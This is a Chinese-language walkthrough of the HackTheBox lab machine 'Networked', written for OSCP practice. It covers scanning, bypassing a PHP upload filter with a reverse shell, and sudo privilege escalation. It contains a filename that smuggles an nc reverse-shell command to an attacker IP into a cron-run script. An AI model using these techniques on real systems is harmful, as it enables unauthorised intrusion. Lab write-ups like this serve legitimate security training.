---
title: "Networked"
description: "这篇HackTheBox Linux 靶机 Networked 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Networked 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-09-18T21:51:18+08:00"
publishDate: "2024-09-18T21:51:18+08:00"
lastmod: "2024-09-18T21:51:18+08:00"
url: "/hackthebox/linux/networked/"
image: "images/oscp-banners/banner-003.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器进行端口扫描

```
sudo nmap -p- 10.10.10.146 -open
```

![image-20240918184230833](https://s2.loli.net/2024/09/18/8epAQSvs3UPrhRq.png)

对开放端口进一步进行探测

```
sudo nmap -p22,80 -A 10.10.10.146 -oX Networked.xml
```

![image-20240918184418453](https://s2.loli.net/2024/09/18/raZ81dkYo6bihQm.png)

我们通过路径扫描获得以下信息

```
dirsearch -u http://10.10.10.146/
```

![image-20240918205607867](https://s2.loli.net/2024/09/18/9kAUlu41xtFDVfJ.png)

优先下载backup文件中的backup.tar

![image-20240918205701702](https://s2.loli.net/2024/09/18/DHJx76VYveZBmnu.png)

![image-20240918205721213](https://s2.loli.net/2024/09/18/gekGTXY6PJl1wu7.png)

```
tar -xvf backup.tar
```

解压后获得以下四个php文件

lib.php中

![image-20240918205853091](https://s2.loli.net/2024/09/18/fFotz9Rd6rsyUHu.png)

会对头文件属性进行判断mime

upload.php中

![image-20240918205930881](https://s2.loli.net/2024/09/18/1DUmijdtXGuyweV.png)

首先会对文件大小进行判断

其次会对文件后缀进行判断

![image-20240918205952881](https://s2.loli.net/2024/09/18/rVoyjJ3u2cwzU5F.png)

所以我们可以进行上传但需要进行构造

我们首先拷贝php-reverse-shell.php

![image-20240918210036674](https://s2.loli.net/2024/09/18/RULEOoQZ2zV7DHu.png)

最终改造成上述发送成功

访问photos.php

![image-20240918210109911](https://s2.loli.net/2024/09/18/le816w9fnXN3diM.png)

![image-20240918210119733](https://s2.loli.net/2024/09/18/UrXS2d9jtmR37hf.png)

成功反弹回shell，优先升级下终端shell

```
python -c "import pty;pty.spawn('/bin/bash')"
```



![image-20240918210237023](https://s2.loli.net/2024/09/18/nmZ2uOHzPC64Xy9.png)

查看/etc/passwd文件存在两个用户具备bash权限，所以要考虑su到guly用户

检查/home/guly下目录，发现一个crontab文件

![image-20240918211539780](https://s2.loli.net/2024/09/18/GOBqUm7MuLxcH8P.png)

![image-20240918211550573](https://s2.loli.net/2024/09/18/bnzhmXGMkCTPNrj.png)

![image-20240918211603474](https://s2.loli.net/2024/09/18/DzHxw4lACkFMsfe.png)

对应crontab脚本每三分钟执行一次，会去检查/var/www/html/uploads/下的文件内容，其中

```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

因为执行的路径名称为$path$value，那么如果在文件名中带；或者‘可以让命令执行，实现命令注入

尝试在/var/www/html/uploads/下新建一个文件

```
touch 'id;nc -c sh 10.10.16.15 1234'
```

等待几分钟

![image-20240918212738873](https://s2.loli.net/2024/09/18/Q4EKuwLgDArS3Z2.png)

成功切换到guly，并取得了user.txt的flag内容

```
sudo -l
```

![image-20240918212943606](https://s2.loli.net/2024/09/18/Pud2ibJSL7MFQaX.png)

![image-20240918214705963](https://s2.loli.net/2024/09/18/bd7BsANqKRzjP8k.png)

这个脚本就是编写一个网络配置脚本，根据Google到的内容，写入的网络配置项目如果存在空格，后续的命令会被执行，（https://seclists.org/fulldisclosure/2019/Apr/24）

![image-20240918214810455](https://s2.loli.net/2024/09/18/SrY2ndBxgqpoRuP.png)

成功获取flag

